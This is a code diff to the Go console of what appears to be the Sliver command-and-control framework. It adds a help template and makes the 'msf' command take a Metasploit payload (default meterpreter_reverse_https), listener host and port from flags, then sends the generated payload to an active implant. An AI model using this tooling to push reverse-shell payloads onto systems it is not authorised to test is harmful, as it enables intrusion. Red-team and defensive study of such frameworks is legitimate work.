@@ -2,12 +2,14 @@ package main
 
 import (
 	"bufio"
+	"flag"
 	"fmt"
 	"io"
 	"log"
 	"os"
 	pb "sliver/protobuf"
 	"strings"
+	"text/template"
 
 	"github.com/golang/protobuf/proto"
 	"golang.org/x/crypto/ssh/terminal"
@@ -37,9 +39,6 @@ const (
 	Debug = bold + purple + "[-] " + normal
 	// Woot - Display success
 	Woot = bold + green + "[$] " + normal
-
-	// Empty level
-	Empty = ""
 )
 
 var (
@@ -117,7 +116,7 @@ func lineReader(term *terminal.Terminal, reader chan string, done chan bool) {
 			continue
 		} else {
 			reader <- line
-			<-done
+			<-done // Block until command completes
 		}
 	}
 }
@@ -145,6 +144,16 @@ func getSliverByName(name string) *Sliver {
 
 // ---------------- Commands ----------------
 func help(term *terminal.Terminal, args []string) {
+	tmpl, _ := template.New("help").Delims("[[", "]]").Parse(getHelpFor(args))
+	tmpl.Execute(term, struct {
+		Normal    string
+		Bold      string
+		Underline string
+	}{
+		Normal:    normal,
+		Bold:      bold,
+		Underline: underline,
+	})
 
 }
 
@@ -220,28 +229,34 @@ func generate(term *terminal.Terminal, args []string) {
 
 func msf(term *terminal.Terminal, args []string) {
 	if activeSliver != nil {
-		fmt.Fprintf(term, Info+"Generating payload ...\n")
+		msfFlags := flag.NewFlagSet("msf", flag.ContinueOnError)
+		payloadName := msfFlags.String("payload", "meterpreter_reverse_https", "metasploit payload")
+		lhost := msfFlags.String("lhost", "", "metasploit listener lhost")
+		lport := msfFlags.Int("lport", 4444, "metasploit listner port")
+		msfFlags.Parse(args)
+
+		fmt.Fprintf(term, Info+"Generating %s/%s -> %s:%d ...\n", activeSliver.Os, activeSliver.Arch, *lhost, *lport)
 		config := VenomConfig{
 			Os:         activeSliver.Os,
-			Arch:       "x64",
-			Payload:    "meterpreter_reverse_https",
-			LHost:      "172.16.20.1",
-			LPort:      4444,
+			Arch:       MsfArch(activeSliver.Arch),
+			Payload:    *payloadName,
+			LHost:      *lhost,
+			LPort:      uint16(*lport),
 			Encoder:    "",
-			Iterations: 0,
+			Iterations: 0, // TODO: Add support for msf encoders/encrypters
 			Encrypt:    "",
 		}
-		payload, err := MsfVenomPayload(config)
+		rawPayload, err := MsfVenomPayload(config)
 		if err != nil {
 			fmt.Fprintf(term, Warn+"Error while generating payload: %v\n", err)
 			return
 		}
-		fmt.Fprintf(term, Info+"Successfully generated payload %d byte(s)\n", len(payload))
+		fmt.Fprintf(term, Info+"Successfully generated payload %d byte(s)\n", len(rawPayload))
 
 		fmt.Fprintf(term, Info+"Sending payload -> %s\n", activeSliver.Name)
 		data, _ := proto.Marshal(&pb.Task{
 			Encoder: "raw",
-			Data:    payload,
+			Data:    rawPayload,
 		})
 		(*activeSliver).Send <- pb.Envelope{
 			Type: "task",
